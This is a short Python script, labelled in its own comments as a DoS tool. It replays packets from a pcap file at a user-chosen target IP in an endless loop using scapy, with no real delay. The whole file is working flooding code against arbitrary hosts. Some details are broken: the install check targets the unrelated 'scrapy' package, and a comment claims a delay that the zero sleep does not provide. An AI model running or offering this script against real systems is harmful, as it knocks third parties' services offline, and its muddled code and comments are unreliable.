import subprocess
import sys
import os
import time
import scapy.all as scapy

# Function to check and install scrapy if not found
def check_and_install_scrapy():
    try:
        import scrapy
        print("Scrapy is already installed.")
    except ImportError:
        print("Scrapy not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "scrapy"])

# Function to send packets to a target IP
def send_packets_to_ip(pcap_file, target_ip):
    if not os.path.exists(pcap_file):
        print(f"Error: The file {pcap_file} does not exist!")
        return
    
    try:
        # Read packets from pcap file
        packets = scapy.rdpcap(pcap_file)
        print(f"Read {len(packets)} packets from {pcap_file}.")
        
        # Sending the packets in a loop (DoS)
        while True:
            for packet in packets:
                if packet.haslayer(scapy.IP):
                    # Change destination IP address of the packet to the specified target IP
                    packet[scapy.IP].dst = target_ip
                scapy.send(packet)
            time.sleep(0.00)  # Add delay to prevent overwhelming the system too quickly

    except Exception as e:
        print(f"An error occurred: {e}")

# Main function
def main():
    # Check for scrapy installation
    check_and_install_scrapy()

    # Ask user for pcap file path and target IP
    pcap_file = input("Enter the path to your pcap file: ")
    target_ip = input("Enter the target IP address: ")
    
    # Send packets from pcap file to the target IP
    send_packets_to_ip(pcap_file, target_ip)

if __name__ == "__main__":
    main()
